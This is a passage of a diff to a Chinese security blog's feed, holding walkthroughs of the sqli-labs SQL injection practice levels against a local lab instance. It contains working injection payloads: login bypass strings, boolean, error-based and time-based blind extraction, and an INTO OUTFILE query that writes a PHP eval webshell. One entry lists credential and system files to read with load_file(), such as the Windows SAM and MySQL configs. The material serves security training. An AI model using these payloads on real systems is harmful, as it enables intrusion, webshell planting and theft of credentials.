plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&quot;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100407.png" alt="image"></p><h2 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h2><p>本关id参数使用了’)过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100408.png" alt="image"></p><blockquote><p>我们可以明显的看到本关不会显示你的登录信息了，只能给你一个是否登录成功的返回数据。那我们这里可以用下布尔类型的盲注。</p></blockquote><p>猜测数据库第一位:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;)and left(database(),1)&gt;&#39;a&#39;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100409.png" alt="image"></p><p>登录成功，就这样可以挨着对每一位进行测试，<code>less5</code>中我们已经讲到了这个过程了，这里就不重复了。</p><blockquote><p>在按位进行猜解的过程中，可以利用二分法，可以有效的降低尝试次<br>数</p></blockquote><h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><p>本关id参数使用了”过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100410.png" alt="image"></p><p>登录成功，同样没有输入结果，这里使用报错盲注演示一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100411.png" alt="image"></p><p>可以看到报错了，显示版本信息</p><h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>本关id参数使用了’过滤，且没有错误提示，那么我们只能靠猜测进行盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100412.png" alt="image"></p><p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p><h2 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h2><p>本关和Less15的处理方法是一样的，同样使用延时注入的方法进行解决。不同的是id参数使用了”)的处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;)and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100413.png" alt="image"></p><p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Less11&quot;&gt;&lt;a href=&quot;#Less11&quot; class=&quot;headerlink&quot; title=&quot;Less11&quot;&gt;&lt;/a&gt;Less11&lt;/h2&gt;&lt;p&gt;这一关开始使用post注入，什么是post注入呢？&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt; 就是数据从客户端提交&lt;br&gt;到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，&lt;br&gt;提交到服务器后服务器再进行验证。这就是一次 post 的过程的。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;当我们输入&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;username:admin&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Password:ddd(任意值)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100404.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;显示错误了，可以从错误中分析到程序对参数进行单引号的处理。&lt;br&gt;这里我们可以在输入框输入万能密码来尝试一下。&lt;/p&gt;
+&lt;p&gt;这里&lt;code&gt;username&lt;/code&gt;输入：&lt;code&gt;admin&amp;#39;or&amp;#39;1&amp;#39;=&amp;#39;1#&lt;/code&gt;，密码随意&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100405.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;返回的正确的结果，那么原因是什么呢？我们在&lt;code&gt;background-1&lt;/code&gt;中已经其实提到了，逻辑运算的部分中已经讲解了原理。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqli-labs靶场Less-8-10</title>
+    <link href="https://hzktester.top/2020/10/04/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-8-10/"/>
+    <id>https://hzktester.top/2020/10/04/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-8-10/</id>
+    <published>2020-10-04T08:33:00.000Z</published>
+    <updated>2020-10-04T08:33:23.391Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>经过简单的测试，发现<code>&#39;or 1=1--+</code>返回结果正常，基本确定应该怎么注入了</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100401.png" alt="image"></p><p>这里查看源码可以看出，对sql报错进行了注释，那么采用报错注入就不行了</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100402.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat(0x3a,0x3a,(select user())),0x3a,0x3a,floor(rand(0)*2))a from information schema.columns group by a--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100403.png" alt="image"></p><p>如果报错注入可以使用的话是可以直接返回user()的，但是这里没有返回。</p><p>其他的payload参考less5直接进行注入即可</p><h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>本关从标题可以看到《基于时间-单引号》，所以很明显这关要利用延时注入进行，同时id参数进行的是’的处理。大概演示一次演示注入。使用<code>sleep()</code>函数</p><p>这里因为利用的是时间的延迟，贴图就没意义了，只写payload了：（正确的时候直接返回，不正确的时候等待5秒钟，只贴正确的）</p><h3 id="猜测数据库"><a href="#猜测数据库" class="headerlink" title="猜测数据库"></a>猜测数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>说明第一位是s（ascii码是115）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr(database(),2,1))&#x3D;101,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>说明第二位是e（ascii码是101）</p><p>……</p><p>以此类推，我们知道了数据库名字是<code>security</code></p><h3 id="猜测security的数据表"><a href="#猜测security的数据表" class="headerlink" title="猜测security的数据表"></a>猜测security的数据表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>猜测第一个数据表的第一位是 e,…依次类推，得到<code>email</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and If(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))&#x3D;114,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>猜测第二个数据表的第一位是 r,…依次类推，得到<code>referers</code></p><p>……</p><p>再以此类推，我们可以得到所有的数据表<code>emails,referers,uagents,users</code></p><h3 id="猜测users表的列"><a href="#猜测users表的列" class="headerlink" title="猜测users表的列"></a>猜测users表的列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1 &#39;and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>猜测<code>users</code>表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是<code>id,username,password</code></p><h3 id="猜测username的值"><a href="#猜测username的值" class="headerlink" title="猜测username的值"></a>猜测username的值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;1&#39;and If(ascii(substr((select username from users limit 0,1), 1,1))&#x3D;67,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>猜测<code>username</code>的第一行的第一位</p><p>以此类推，我们得到数据库<code>username,password</code>的所有内容</p><h2 id="Less10"><a href="#Less10" class="headerlink" title="Less10"></a>Less10</h2><p>本关我们从标题就可以看到《基于时间-双引号》，所以很明显的这关要我们利用延时注入进行，同时id参数进行的是“的处理。和less9的区别就在于单引号（‘）变成了（“）,我们这里给出一个 payload 示例，其他的请参考 less-9</p><h3 id="猜测数据库-1"><a href="#猜测数据库-1" class="headerlink" title="猜测数据库"></a>猜测数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>其余的示例请参考 less9</p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Less8&quot;&gt;&lt;a href=&quot;#Less8&quot; class=&quot;headerlink&quot; title=&quot;Less8&quot;&gt;&lt;/a&gt;Less8&lt;/h2&gt;&lt;p&gt;经过简单的测试，发现&lt;code&gt;&amp;#39;or 1=1--+&lt;/code&gt;返回结果正常，基本确定应该怎么注入了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100401.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;这里查看源码可以看出，对sql报错进行了注释，那么采用报错注入就不行了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100402.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;sqli-labs&amp;#x2F;Less-8&amp;#x2F;?id&amp;#x3D;1&amp;#39; union select 1,count(*),concat(0x3a,0x3a,(select user())),0x3a,0x3a,floor(rand(0)*2))a from information schema.columns group by a--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100403.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;如果报错注入可以使用的话是可以直接返回user()的，但是这里没有返回。&lt;/p&gt;
+&lt;p&gt;其他的payload参考less5直接进行注入即可&lt;/p&gt;
+&lt;h2 id=&quot;less9&quot;&gt;&lt;a href=&quot;#less9&quot; class=&quot;headerlink&quot; title=&quot;less9&quot;&gt;&lt;/a&gt;less9&lt;/h2&gt;</summary>
+    
+    
+    
+    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqli-labs靶场Less-7(上传webshell)</title>
+    <link href="https://hzktester.top/2020/10/02/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-7(%E4%B8%8A%E4%BC%A0webshell)/"/>
+    <id>https://hzktester.top/2020/10/02/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-7(%E4%B8%8A%E4%BC%A0webshell)/</id>
+    <published>2020-10-01T17:35:00.000Z</published>
+    <updated>2020-10-01T17:35:12.680Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>本关利用文件导入的方式进行注入</p><p>查看源码，重点关注对id参数的处理和sql语句上，源代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>这里对id参数进行了’))处理，所以可以尝试<code>&#39;)) or 1=1--+</code>进行注入</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100201.png" alt="image"></p><p>我们这里利用上述提到的文件导入的方式进行演示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,3 into outfile &quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100202.png" alt="image"></p><p>上图中显示sql语句出错了，但是文件中可以看到1.txt已经生成了。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100203.png" alt="image"></p><p>直接写入php一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,&#39;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100204.png" alt="image"></p><p>文件中可以看到已经上传成功了</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100205.png" alt="image"></p><p>然后使用冰蝎、菜刀等工具连接即可</p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Less7&quot;&gt;&lt;a href=&quot;#Less7&quot; class=&quot;headerlink&quot; title=&quot;Less7&quot;&gt;&lt;/a&gt;Less7&lt;/h2&gt;&lt;p&gt;本关利用文件导入的方式进行注入&lt;/p&gt;
+&lt;p&gt;查看源码，重点关注对id参数的处理和sql语句上，源代码如下：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$sql&amp;#x3D;&amp;quot;SELECT * FROM users WHERE id&amp;#x3D;((&amp;#39;$id&amp;#39;)) LIMIT 0,1&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这里对id参数进行了’))处理，所以可以尝试&lt;code&gt;&amp;#39;)) or 1=1--+&lt;/code&gt;进行注入&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100201.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;我们这里利用上述提到的文件导入的方式进行演示：&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;sqli-labs&amp;#x2F;Less-7&amp;#x2F;?id&amp;#x3D;1&amp;#39;))UNION SELECT 1,2,3 into outfile &amp;quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\1.txt&amp;quot;--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020100202.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;上图中显示sql语句出错了，但是文件中可以看到1.txt已经生成了。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
+    
+    
+    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
+    
+  </entry>
   
   <entry>
     <title>Spring Cloud Config 目录穿越漏洞复现（CVE-2020-5410）</title>
@@ -282,405 +735,6 @@
     
     
     <category term="WebLogic" scheme="https://hzktester.top/tags/WebLogic/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sqli-labs-Background-3 导入导出的相关操作</title>
-    <link href="https://hzktester.top/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-3%20%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E7%9A%84%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/"/>
-    <id>https://hzktester.top/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-3%20%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E7%9A%84%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</id>
-    <published>2020-09-24T08:05:00.000Z</published>
-    <updated>2020-09-24T08:05:51.088Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h2><blockquote><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p></blockquote><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><ol><li>必须有权限读取并且文件必须完全可读 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0&#x2F;*    &#x2F;&#x2F;如果结果返回正常,说明具有读写权限。</span><br><span class="line">and (select count(*) from mysql.user)&gt;0&#x2F;*    &#x2F;&#x2F;返回错误，应该是管理员给数据库帐户降权了</span><br></pre></td></tr></table></figure></li><li>欲读取文件必须在服务器上</li><li>必须指定文件完整的路径</li><li>欲读取文件必须小于 max_allowed_packet<blockquote><p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的<br>就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有<br>administrators 才能访问的文件，users 就别想 load_file 出来</p></blockquote></li></ol><h3 id="在实际的注入中，有两个难点需要解决："><a href="#在实际的注入中，有两个难点需要解决：" class="headerlink" title="在实际的注入中，有两个难点需要解决："></a>在实际的注入中，有两个难点需要解决：</h3><ol><li>绝对物理路径</li><li>构造有效的畸形语句（报错爆出绝对路径）<blockquote><p>在很多 PHP 程序中，当提交一个错误的 Query，如果 display_errors = on，程序就会暴露<br>WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的 PHP 程序来说，整个服务<br>器的安全将受到严重的威胁.</p></blockquote></li></ol><h3 id="常用路径："><a href="#常用路径：" class="headerlink" title="常用路径："></a>常用路径：</h3><h4 id="WINDOWS下："><a href="#WINDOWS下：" class="headerlink" title="WINDOWS下："></a>WINDOWS下：</h4><table><thead><tr><th>路径</th><th>备注</th></tr></thead><tbody><tr><td>c:/boot.ini</td><td>查看系统版本</td></tr><tr><td>c:/windows/php.ini 或 c:/winnt/php.ini</td><td>php配置信息</td></tr><tr><td>c:/windows/my.ini 或 c:/winnt/my.ini 或 C:\Program Files\mysql\my.ini</td><td>MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</td></tr><tr><td>c:\mysql\data\mysql\user.MYD</td><td>存储了mysql.user表中的数据库连接密码</td></tr><tr><td>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini</td><td>存储了虚拟主机网站路径和密码</td></tr><tr><td>c:\Program Files\Serv-U\ServUDaemon.ini</td><td>存储了虚拟主机网站路径和密码</td></tr><tr><td>c:\windows\system32\inetsrv\MetaBase.xml</td><td>查看IIS的虚拟主机配置</td></tr><tr><td>c:\windows\repair\sam</td><td>存储了WINDOWS系统初次安装的密码</td></tr><tr><td>c:\Program Files\ Serv-U\ServUAdmin.exe</td><td>6.0版本以前的serv-u管理员密码存储</td></tr><tr><td>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</td><td>serv-u管理员密码存储</td></tr><tr><td>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件</td><td>存储了pcAnywhere的登陆密码</td></tr><tr><td>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf</td><td>查看WINDOWS系统apache文件</td></tr><tr><td>c:/Resin-3.0.14/conf/resin.conf</td><td>查看jsp开发的网站 resin文件配置信息</td></tr><tr><td>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf</td><td>查看linux系统配置的JSP虚拟主机</td></tr><tr><td>C:\mysql\data\mysql\user.MYD</td><td>存在MYSQL系统中的用户密码</td></tr></tbody></table><h4 id="LUNIX-UNIX-下"><a href="#LUNIX-UNIX-下" class="headerlink" title="LUNIX/UNIX 下:"></a>LUNIX/UNIX 下:</h4><table><thead><tr><th>路径</th><th>备注</th></tr></thead><tbody><tr><td>/usr/local/app/apache2/conf/httpd.conf</td><td>apache2缺省配置文件</td></tr><tr><td>/usr/local/apache2/conf/httpd.conf</td><td>apache2缺省配置文件</td></tr><tr><td>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</td><td>虚拟网站设置</td></tr><tr><td>/usr/local/app/php5/lib/php.ini</td><td>PHP相关设置</td></tr><tr><td>/etc/sysconfig/iptables</td><td>从中得到防火墙规则策略</td></tr><tr><td>/etc/httpd/conf/httpd.conf</td><td>apache配置文件</td></tr><tr><td>/etc/rsyncd.conf</td><td>同步程序配置文件</td></tr><tr><td>/etc/my.cnf</td><td>mysql的配置文件</td></tr><tr><td>/etc/redhat-release 或 /etc/issue 或 /etc/issue.net</td><td>系统版本</td></tr><tr><td>/etc/httpd/conf/httpd.conf 或 /usr/local/apche/conf/httpd.conf</td><td>查看linux APACHE虚拟主机配置文件</td></tr><tr><td>/usr/local/resin-3.0.22/conf/resin.conf</td><td>针对3.0.22的RESIN配置文件查看</td></tr><tr><td>/usr/local/resin-pro-3.0.22/conf/resin.conf</td><td>针对3.0.22的RESIN配置文件查看</td></tr><tr><td>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</td><td>查看jsp开发的网站 resin文件配置信息</td></tr><tr><td>load_file(char(47))</td><td>列出FreeBSD,Sunos系统根目录</td></tr><tr><td>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</td><td></td></tr><tr><td>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</td><td></td></tr></tbody></table><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))</span><br></pre></td></tr></table></figure><p>利用hex()将文件内容导出来，尤其是smb文件时使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">    &#x2F;&#x2F;char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:&#x2F;boot.ini”的 ASCII 代码</span><br><span class="line">union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</span><br><span class="line">    &#x2F;&#x2F;“c:&#x2F;boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”</span><br><span class="line">union select 1,1,1,load_file(c:\\boot.ini)</span><br><span class="line">    &#x2F;&#x2F;路径里的&#x2F;用 \\代替</span><br></pre></td></tr></table></figure><h2 id="文件导入到数据库"><a href="#文件导入到数据库" class="headerlink" title="文件导入到数据库"></a>文件导入到数据库</h2><h3 id="LOAD-DATA-INFILE-语句"><a href="#LOAD-DATA-INFILE-语句" class="headerlink" title="LOAD DATA INFILE 语句"></a>LOAD DATA INFILE 语句</h3><p><strong>LOAD DATA INFILE</strong> 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &#39;&#x2F;tmp&#x2F;test.txt&#39; into table test character set gbk fields terminated by &#39;\t&#39; lines terminated by &#39;\n&#39;</span><br></pre></td></tr></table></figure><p>将/tmp/test.txt 导入到 test 表中，<strong>character set gbk</strong> 是字符集设置为<strong>gbk</strong>，<strong>fields terminated by</strong> 是每一项数据之间的分隔符，<strong>lines terminated by</strong> 是行的结尾符。</p><h2 id="导入到文件"><a href="#导入到文件" class="headerlink" title="导入到文件"></a>导入到文件</h2><h3 id="INFO-OUTFILE语句"><a href="#INFO-OUTFILE语句" class="headerlink" title="INFO OUTFILE语句"></a>INFO OUTFILE语句</h3><p>直接上传一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
